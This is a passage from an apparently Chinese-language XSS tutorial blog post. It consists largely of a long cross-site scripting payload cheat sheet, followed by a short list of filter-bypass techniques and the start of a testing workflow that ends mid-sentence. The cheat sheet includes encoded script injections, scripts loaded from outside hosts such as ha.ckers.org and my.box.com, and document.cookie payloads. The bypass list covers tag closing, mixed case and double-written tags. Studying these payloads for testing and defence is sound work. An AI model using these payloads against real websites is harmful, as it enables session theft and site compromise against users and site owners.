class="symbol">&amp;lt;</span>/SCRIPT<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>SCRIPT a=\&quot;<span class="symbol">&amp;gt;</span>\&quot; &#x27;&#x27; SRC=\&quot;http<span class="symbol">&amp;#58;</span>//ha<span class="symbol">&amp;#46;</span>ckers<span class="symbol">&amp;#46;</span>org/xss<span class="symbol">&amp;#46;</span>js\&quot;<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>/SCRIPT<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>SCRIPT \&quot;a=&#x27;<span class="symbol">&amp;gt;</span>&#x27;\&quot; SRC=\&quot;http<span class="symbol">&amp;#58;</span>//ha<span class="symbol">&amp;#46;</span>ckers<span class="symbol">&amp;#46;</span>org/xss<span class="symbol">&amp;#46;</span>js\&quot;<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>/SCRIPT<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>SCRIPT a=`<span class="symbol">&amp;gt;</span>` SRC=\&quot;http<span class="symbol">&amp;#58;</span>//ha<span class="symbol">&amp;#46;</span>ckers<span class="symbol">&amp;#46;</span>org/xss<span class="symbol">&amp;#46;</span>js\&quot;<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>/SCRIPT<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>SCRIPT a=\&quot;<span class="symbol">&amp;gt;</span>&#x27;<span class="symbol">&amp;gt;</span>\&quot; SRC=\&quot;http<span class="symbol">&amp;#58;</span>//ha<span class="symbol">&amp;#46;</span>ckers<span class="symbol">&amp;#46;</span>org/xss<span class="symbol">&amp;#46;</span>js\&quot;<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>/SCRIPT<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>SCRIPT<span class="symbol">&amp;gt;</span>document<span class="symbol">&amp;#46;</span>write(\&quot;<span class="symbol">&amp;lt;</span>SCRI\&quot;);<span class="symbol">&amp;lt;</span>/SCRIPT<span class="symbol">&amp;gt;</span>PT SRC=\&quot;http<span class="symbol">&amp;#58;</span>//ha<span class="symbol">&amp;#46;</span>ckers<span class="symbol">&amp;#46;</span>org/xss<span class="symbol">&amp;#46;</span>js\&quot;<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>/SCRIPT<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>A HREF=\&quot;http<span class="symbol">&amp;#58;</span>//66<span class="symbol">&amp;#46;</span>102<span class="symbol">&amp;#46;</span>7<span class="symbol">&amp;#46;</span>147/\&quot;<span class="symbol">&amp;gt;</span>XSS<span class="symbol">&amp;lt;</span>/A<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>A HREF=\&quot;http<span class="symbol">&amp;#58;</span>//%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D\&quot;<span class="symbol">&amp;gt;</span>XSS<span class="symbol">&amp;lt;</span>/A<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>A HREF=\&quot;http<span class="symbol">&amp;#58;</span>//1113982867/\&quot;<span class="symbol">&amp;gt;</span>XSS<span class="symbol">&amp;lt;</span>/A<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>A HREF=\&quot;http<span class="symbol">&amp;#58;</span>//0x42<span class="symbol">&amp;#46;</span>0x0000066<span class="symbol">&amp;#46;</span>0x7<span class="symbol">&amp;#46;</span>0x93/\&quot;<span class="symbol">&amp;gt;</span>XSS<span class="symbol">&amp;lt;</span>/A<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>A HREF=\&quot;http<span class="symbol">&amp;#58;</span>//0102<span class="symbol">&amp;#46;</span>0146<span class="symbol">&amp;#46;</span>0007<span class="symbol">&amp;#46;</span>00000223/\&quot;<span class="symbol">&amp;gt;</span>XSS<span class="symbol">&amp;lt;</span>/A<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>A HREF=\&quot;htt p<span class="symbol">&amp;#58;</span>//6 6<span class="symbol">&amp;#46;</span>000146<span class="symbol">&amp;#46;</span>0x7<span class="symbol">&amp;#46;</span>147/\&quot;<span class="symbol">&amp;gt;</span>XSS<span class="symbol">&amp;lt;</span>/A<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>A HREF=\&quot;//www<span class="symbol">&amp;#46;</span>google<span class="symbol">&amp;#46;</span>com/\&quot;<span class="symbol">&amp;gt;</span>XSS<span class="symbol">&amp;lt;</span>/A<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>A HREF=\&quot;//google\&quot;<span class="symbol">&amp;gt;</span>XSS<span class="symbol">&amp;lt;</span>/A<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>A HREF=\&quot;http<span class="symbol">&amp;#58;</span>//ha<span class="symbol">&amp;#46;</span>ckers<span class="symbol">&amp;#46;</span>org@google\&quot;<span class="symbol">&amp;gt;</span>XSS<span class="symbol">&amp;lt;</span>/A<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>A HREF=\&quot;http<span class="symbol">&amp;#58;</span>//google<span class="symbol">&amp;#58;</span>ha<span class="symbol">&amp;#46;</span>ckers<span class="symbol">&amp;#46;</span>org\&quot;<span class="symbol">&amp;gt;</span>XSS<span class="symbol">&amp;lt;</span>/A<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>A HREF=\&quot;http<span class="symbol">&amp;#58;</span>//google<span class="symbol">&amp;#46;</span>com/\&quot;<span class="symbol">&amp;gt;</span>XSS<span class="symbol">&amp;lt;</span>/A<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>A HREF=\&quot;http<span class="symbol">&amp;#58;</span>//www<span class="symbol">&amp;#46;</span>google<span class="symbol">&amp;#46;</span>com<span class="symbol">&amp;#46;</span>/\&quot;<span class="symbol">&amp;gt;</span>XSS<span class="symbol">&amp;lt;</span>/A<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>A HREF=\&quot;javascript<span class="symbol">&amp;#058;</span>document<span class="symbol">&amp;#46;</span>location=&#x27;http<span class="symbol">&amp;#58;</span>//www<span class="symbol">&amp;#46;</span>google<span class="symbol">&amp;#46;</span>com/&#x27;\&quot;<span class="symbol">&amp;gt;</span>XSS<span class="symbol">&amp;lt;</span>/A<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>A HREF=\&quot;http<span class="symbol">&amp;#58;</span>//www<span class="symbol">&amp;#46;</span>gohttp<span class="symbol">&amp;#58;</span>//www<span class="symbol">&amp;#46;</span>google<span class="symbol">&amp;#46;</span>com/ogle<span class="symbol">&amp;#46;</span>com/\&quot;<span class="symbol">&amp;gt;</span>XSS<span class="symbol">&amp;lt;</span>/A<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>%3C&amp;lt<span class="symbol">&amp;lt;</span>&amp;LT<span class="symbol">&amp;LT;</span>&amp;#60&amp;#060&amp;#0060&amp;#00060&amp;#000060&amp;#0000060<span class="symbol">&amp;lt;</span>&amp;#x3c&amp;#x03c&amp;#x003c&amp;#x0003c&amp;#x00003c&amp;#x000003c<span class="symbol">&amp;#x3c;</span><span class="symbol">&amp;#x03c;</span><span class="symbol">&amp;#x003c;</span><span class="symbol">&amp;#x0003c;</span><span class="symbol">&amp;#x00003c;</span><span class="symbol">&amp;#x000003c;</span>&amp;#X3c&amp;#X03c&amp;#X003c&amp;#X0003c&amp;#X00003c&amp;#X000003c<span class="symbol">&amp;#X3c;</span><span class="symbol">&amp;#X03c;</span><span class="symbol">&amp;#X003c;</span><span class="symbol">&amp;#X0003c;</span><span class="symbol">&amp;#X00003c;</span><span class="symbol">&amp;#X000003c;</span>&amp;#x3C&amp;#x03C&amp;#x003C&amp;#x0003C&amp;#x00003C&amp;#x000003C<span class="symbol">&amp;#x3C;</span><span class="symbol">&amp;#x03C;</span><span class="symbol">&amp;#x003C;</span><span class="symbol">&amp;#x0003C;</span><span class="symbol">&amp;#x00003C;</span><span class="symbol">&amp;#x000003C;</span>&amp;#X3C&amp;#X03C&amp;#X003C&amp;#X0003C&amp;#X00003C&amp;#X000003C<span class="symbol">&amp;#X3C;</span><span class="symbol">&amp;#X03C;</span><span class="symbol">&amp;#X003C;</span><span class="symbol">&amp;#X0003C;</span><span class="symbol">&amp;#X00003C;</span><span class="symbol">&amp;#X000003C;</span>\x3c\x3C\u003c\u003C<span class="symbol">&amp;lt;</span>iframe src=http<span class="symbol">&amp;#58;</span>//ha<span class="symbol">&amp;#46;</span>ckers<span class="symbol">&amp;#46;</span>org/scriptlet<span class="symbol">&amp;#46;</span>html<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>IMG SRC=\&quot;javascript<span class="symbol">&amp;#058;</span>alert(&#x27;XSS&#x27;)\&quot;<span class="symbol">&amp;lt;</span>SCRIPT SRC=//ha<span class="symbol">&amp;#46;</span>ckers<span class="symbol">&amp;#46;</span>org/<span class="symbol">&amp;#46;</span>js<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>SCRIPT SRC=http<span class="symbol">&amp;#58;</span>//ha<span class="symbol">&amp;#46;</span>ckers<span class="symbol">&amp;#46;</span>org/xss<span class="symbol">&amp;#46;</span>js?<span class="symbol">&amp;lt;</span>B<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span><span class="symbol">&amp;lt;</span>SCRIPT<span class="symbol">&amp;gt;</span>alert(\&quot;XSS\&quot;);//<span class="symbol">&amp;lt;</span><span class="symbol">&amp;lt;</span>/SCRIPT<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>SCRIPT/SRC=\&quot;http<span class="symbol">&amp;#58;</span>//ha<span class="symbol">&amp;#46;</span>ckers<span class="symbol">&amp;#46;</span>org/xss<span class="symbol">&amp;#46;</span>js\&quot;<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>/SCRIPT<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>BODY onload!#$%&amp;()*~+-_<span class="symbol">&amp;#46;</span>,<span class="symbol">&amp;#58;</span>;?@<span class="symbol">&amp;#91;</span>/|\<span class="symbol">&amp;#93;</span>^`=alert(\&quot;XSS\&quot;)<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>SCRIPT/XSS SRC=\&quot;http<span class="symbol">&amp;#58;</span>//ha<span class="symbol">&amp;#46;</span>ckers<span class="symbol">&amp;#46;</span>org/xss<span class="symbol">&amp;#46;</span>js\&quot;<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>/SCRIPT<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>IMG SRC=\&quot;   javascript<span class="symbol">&amp;#058;</span>alert(&#x27;XSS&#x27;);\&quot;<span class="symbol">&amp;gt;</span>perl -e &#x27;print \&quot;<span class="symbol">&amp;lt;</span>SCR\0IPT<span class="symbol">&amp;gt;</span>alert(\\&quot;XSS\\&quot;)<span class="symbol">&amp;lt;</span>/SCR\0IPT<span class="symbol">&amp;gt;</span>\&quot;;&#x27; <span class="symbol">&amp;gt;</span> outperl -e &#x27;print \&quot;<span class="symbol">&amp;lt;</span>IMG SRC=java\0script<span class="symbol">&amp;#058;</span>alert(\\&quot;XSS\\&quot;)<span class="symbol">&amp;gt;</span>\&quot;;&#x27; <span class="symbol">&amp;gt;</span> out<span class="symbol">&amp;lt;</span>IMG SRC=\&quot;jav<span class="symbol">&amp;#x0D;</span>ascript<span class="symbol">&amp;#058;</span>alert(&#x27;XSS&#x27;);\&quot;<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>IMG SRC=\&quot;jav<span class="symbol">&amp;#x0A;</span>ascript<span class="symbol">&amp;#058;</span>alert(&#x27;XSS&#x27;);\&quot;<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>IMG SRC=\&quot;jav<span class="symbol">&amp;#x09;</span>ascript<span class="symbol">&amp;#058;</span>alert(&#x27;XSS&#x27;);\&quot;<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>IMG SRC=&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>IMG SRC=javascript<span class="symbol">&amp;#058;</span>alert(&#x27;XSS&#x27;)<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>IMG SRC=javascript<span class="symbol">&amp;#058;</span>alert(String<span class="symbol">&amp;#46;</span>fromCharCode(88,83,83))<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>IMG \&quot;\&quot;\&quot;<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>SCRIPT<span class="symbol">&amp;gt;</span>alert(\&quot;XSS\&quot;)<span class="symbol">&amp;lt;</span>/SCRIPT<span class="symbol">&amp;gt;</span>\&quot;<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>IMG SRC=`javascript<span class="symbol">&amp;#058;</span>alert(\&quot;RSnake says, &#x27;XSS&#x27;\&quot;)`<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>IMG SRC=javascript<span class="symbol">&amp;#058;</span>alert(<span class="symbol">&amp;quot;</span>XSS<span class="symbol">&amp;quot;</span>)<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>IMG SRC=JaVaScRiPt<span class="symbol">&amp;#058;</span>alert(&#x27;XSS&#x27;)<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>IMG SRC=javascript<span class="symbol">&amp;#058;</span>alert(&#x27;XSS&#x27;)<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>IMG SRC=\&quot;javascript<span class="symbol">&amp;#058;</span>alert(&#x27;XSS&#x27;);\&quot;<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>SCRIPT SRC=http<span class="symbol">&amp;#58;</span>//ha<span class="symbol">&amp;#46;</span>ckers<span class="symbol">&amp;#46;</span>org/xss<span class="symbol">&amp;#46;</span>js<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>/SCRIPT<span class="symbol">&amp;gt;</span>&#x27;&#x27;;!--\&quot;<span class="symbol">&amp;lt;</span>XSS<span class="symbol">&amp;gt;</span>=&amp;&#123;()&#125;&#x27;;alert(String<span class="symbol">&amp;#46;</span>fromCharCode(88,83,83))//\&#x27;;alert(String<span class="symbol">&amp;#46;</span>fromCharCode(88,83,83))//\&quot;;alert(String<span class="symbol">&amp;#46;</span>fromCharCode(88,83,83))//\\&quot;;alert(String<span class="symbol">&amp;#46;</span>fromCharCode(88,83,83))//--<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>/SCRIPT<span class="symbol">&amp;gt;</span>\&quot;<span class="symbol">&amp;gt;</span>&#x27;<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>SCRIPT<span class="symbol">&amp;gt;</span>alert(String<span class="symbol">&amp;#46;</span>fromCharCode(88,83,83))<span class="symbol">&amp;lt;</span>/SCRIPT<span class="symbol">&amp;gt;</span>&#x27;;alert(String.fromCharCode(88,83,83))//\&#x27;;alert(String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//\&quot;;alert(String.fromCharCode(88,83,83))//--&gt;<span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span>&quot;&gt;&#x27;&gt;<span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span><span class="javascript">alert(<span class="built_in">String</span>.fromCharCode(<span class="number">88</span>,<span class="number">83</span>,<span class="number">83</span>))</span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span>&#x27;&#x27;;!--&quot;<span class="tag">&lt;<span class="name">XSS</span>&gt;</span>=&amp;&#123;()&#125;<span class="tag">&lt;<span class="name">SCRIPT</span> <span class="attr">SRC</span>=<span class="string">http://ha.ckers.org/xss.js</span>&gt;</span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;);&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">javascript:alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">javascrscriptipt:alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">JaVaScRiPt:alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span><span class="tag">&lt;<span class="name">IMG</span> &quot;&quot;&quot;&gt;</span><span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span><span class="javascript">alert(<span class="string">&quot;XSS&quot;</span>)</span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span>&quot;&gt;<span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">&quot; <span class="symbol">&amp;#14;</span>  javascript:alert(&#x27;XSS&#x27;);&quot;</span>&gt;</span>&lt;SCRIPT/XSS SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;<span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span>&lt;SCRIPT/SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;<span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span>&lt;<span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span><span class="javascript">alert(<span class="string">&quot;XSS&quot;</span>);<span class="comment">//&lt;</span></span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span><span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span><span class="javascript">a=<span class="regexp">/XSS/</span>alert(a.source)</span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span>\&quot;;alert(&#x27;XSS&#x27;);//<span class="tag">&lt;/<span class="name">TITLE</span>&gt;</span><span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span><span class="javascript">alert(<span class="string">&quot;XSS&quot;</span>);</span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span>¼script¾alert(¢XSS¢)¼/script¾<span class="tag">&lt;<span class="name">META</span> <span class="attr">HTTP-EQUIV</span>=<span class="string">&quot;refresh&quot;</span> <span class="attr">CONTENT</span>=<span class="string">&quot;0;url=javascript:alert(&#x27;XSS&#x27;);&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">IFRAME</span> <span class="attr">SRC</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;);&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">IFRAME</span>&gt;</span><span class="tag">&lt;<span class="name">FRAMESET</span>&gt;</span><span class="tag">&lt;<span class="name">FRAME</span> <span class="attr">SRC</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;);&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">FRAMESET</span>&gt;</span><span class="tag">&lt;<span class="name">TABLE</span> <span class="attr">BACKGROUND</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;)&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">TABLE</span>&gt;</span><span class="tag">&lt;<span class="name">TD</span> <span class="attr">BACKGROUND</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;)&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">DIV</span> <span class="attr">STYLE</span>=<span class="string">&quot;background-image: url(javascript:alert(&#x27;XSS&#x27;))&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">DIV</span> <span class="attr">STYLE</span>=<span class="string">&quot;background-image:\0075\0072\006C\0028&#x27;\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029&#x27;\0029&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">DIV</span> <span class="attr">STYLE</span>=<span class="string">&quot;width: expression(alert(&#x27;XSS&#x27;));&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">STYLE</span>&gt;</span>@im\port&#x27;\ja\vasc\ript:alert(&quot;XSS&quot;)&#x27;;<span class="tag">&lt;/<span class="name">STYLE</span>&gt;</span><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">STYLE</span>=<span class="string">&quot;xss:expr/*XSS*/ession(alert(&#x27;XSS&#x27;))&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">XSS</span> <span class="attr">STYLE</span>=<span class="string">&quot;xss:expression(alert(&#x27;XSS&#x27;))&quot;</span>&gt;</span>exp/*<span class="tag">&lt;<span class="name">A</span> <span class="attr">STYLE</span>=<span class="string">&#x27;no\xss:noxss(&quot;*//*&quot;);xss:<span class="symbol">&amp;#101;</span>x<span class="symbol">&amp;#x2F;</span>*XSS*//*/*/pression(alert(&quot;XSS&quot;))&#x27;</span>&gt;</span><span class="tag">&lt;<span class="name">EMBED</span> <span class="attr">SRC</span>=<span class="string">&quot;http://ha.ckers.org/xss.swf&quot;</span> <span class="attr">AllowScriptAccess</span>=<span class="string">&quot;always&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">EMBED</span>&gt;</span>a=&quot;get&quot;;b=&quot;URL(ja\&quot;&quot;;c=&quot;vascr&quot;;d=&quot;ipt:ale&quot;;e=&quot;rt(&#x27;XSS&#x27;);\&quot;)&quot;;eval(a+b+c+d+e);<span class="tag">&lt;<span class="name">SCRIPT</span> <span class="attr">SRC</span>=<span class="string">&quot;http://ha.ckers.org/xss.jpg&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span><span class="tag">&lt;<span class="name">HTML</span>&gt;</span><span class="tag">&lt;<span class="name">BODY</span>&gt;</span><span class="meta">&lt;?xml:namespace prefix=&quot;t&quot; ns=&quot;urn:schemas-microsoft-com:time&quot;&gt;&lt;?import namespace=&quot;t&quot; implementation=&quot;#default#time2&quot;&gt;&lt;t:set attributeName=&quot;innerHTML&quot; to=&quot;XSS&amp;lt;SCRIPT DEFER&amp;gt;alert(&amp;quot;XSS&amp;quot;)&amp;lt;/SCRIPT&amp;gt;&quot;&gt;&lt;/BODY&gt;&lt;/HTML&gt;&lt;SCRIPT&gt;document.write(&quot;&lt;SCRI&quot;);&lt;/SCRIPT&gt;PT SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;&lt;form id=&quot;test&quot; /&gt;&lt;button form=&quot;test&quot; formaction=&quot;javascript:alert(123)&quot;&gt;TESTHTML5FORMACTION&lt;form&gt;&lt;button formaction=&quot;javascript:alert(123)&quot;&gt;crosssitespt&lt;frameset onload=alert(123)&gt;&lt;!--&lt;img src=&quot;--&gt;&lt;img src=x onerror=alert(123)//&quot;&gt;&lt;style&gt;&lt;img src=&quot;&lt;/style&gt;&lt;img src=x onerror=alert(123)//&quot;&gt;&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;&lt;embed src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;&lt;embed src=&quot;javascript:alert(1)&quot;&gt;&lt;? foo=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;&lt;! foo=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;&lt;/ foo=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;&lt;script&gt;(&#123;0:#0=alert/#0#/#0#(123)&#125;)&lt;/script&gt;&lt;script&gt;ReferenceError.prototype.__defineGetter__(&#x27;name&#x27;, function()&#123;alert(123)&#125;),x&lt;/script&gt;&lt;script&gt;Object.__noSuchMethod__ = Function,[&#123;&#125;][0].constructor._(&#x27;alert(1)&#x27;)()&lt;/script&gt;&lt;script src=&quot;#&quot;&gt;&#123;alert(1)&#125;&lt;/script&gt;;1&lt;script&gt;crypto.generateCRMFRequest(&#x27;CN=0&#x27;,0,0,null,&#x27;alert(1)&#x27;,384,null,&#x27;rsa-dual-use&#x27;)&lt;/script&gt;&lt;svg xmlns=&quot;#&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/svg&gt;&lt;svg onload=&quot;javascript:alert(123)&quot; xmlns=&quot;#&quot;&gt;&lt;/svg&gt;&lt;iframe xmlns=&quot;#&quot; src=&quot;javascript:alert(1)&quot;&gt;&lt;/iframe&gt;+ADw-script+AD4-alert(document.location)+ADw-/script+AD4-%2BADw-script+AD4-alert(document.location)%2BADw-/script%2BAD4-+ACIAPgA8-script+AD4-alert(document.location)+ADw-/script+AD4APAAi-%2BACIAPgA8-script%2BAD4-alert%28document.location%29%2BADw-%2Fscript%2BAD4APAAi-%253cscript%253ealert(document.cookie)%253c/script%253e“&gt;&lt;s”%2b”cript&gt;alert(document.cookie)&lt;/script&gt;“&gt;&lt;ScRiPt&gt;alert(document.cookie)&lt;/script&gt;“&gt;&lt;&lt;script&gt;alert(document.cookie);//&lt;&lt;/script&gt;foo&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;scr&lt;script&gt;ipt&gt;alert(document.cookie)&lt;/scr&lt;/script&gt;ipt&gt;%22/%3E%3CBODY%20onload=’document.write(%22%3Cs%22%2b%22cript%20src=http://my.box.com/xss.js%3E%3C/script%3E%22)’%3E‘; alert(document.cookie); var foo=’foo\’; alert(document.cookie);//’;&lt;/script&gt;&lt;script &gt;alert(document.cookie)&lt;/script&gt;&lt;img src=asdf onerror=alert(document.cookie)&gt;&lt;BODY ONLOAD=alert(’XSS’)&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;&lt;script&gt;alert(String.fromCharCode(66, 108, 65, 99, 75, 73, 99, 101))&lt;/script&gt;&lt;video src=1 onerror=alert(1)&gt;&lt;audio src=1 onerror=alert(1)&gt;</span></span><br></pre></td></tr></table></figure>





<h3 id="2-3-xss常见绕过方法及流程"><a href="#2-3-xss常见绕过方法及流程" class="headerlink" title="2.3 xss常见绕过方法及流程"></a>2.3 xss常见绕过方法及流程</h3><p>常见绕过方法：</p>
<p>A、常规考察   </p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>B、input标签闭合</p>
<p>C、单引号前后闭合与onclick的使用</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;onclick=&#x27;alert(1)</span><br></pre></td></tr></table></figure>

<p>D、双引号前后闭合与onclick的使用</p>
<p>E、input标签的闭合与a标签的使用</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&gt;<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>F、input标签闭合与大小写转换</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&gt;<span class="tag">&lt;<span class="name">scRPT</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>G、input标签闭合与双写绕过</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&gt;<span class="tag">&lt;<span class="name">sscriptcript</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>H、javascript:伪协议编码</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(1) </span><br></pre></td></tr></table></figure>

<p>I、javascript:伪协议编码与合法输入</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(1)//http://</span><br></pre></td></tr></table></figure>





<p>xss总结：</p>
<p>1、见到框框就插</p>
<p>2、首先使用标准的 语句进行插入，若没有弹窗，则f12审查元素，看是否需要闭合标签，亦或者插入的语句是否被过滤（删除、替换等）</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>若需要闭合标签，则闭合标签即可。</p>
<p>若被过滤，则需要审查元素或者查看源代码，观察哪里被过滤了！</p>
<p>我们初次是插入：</p>
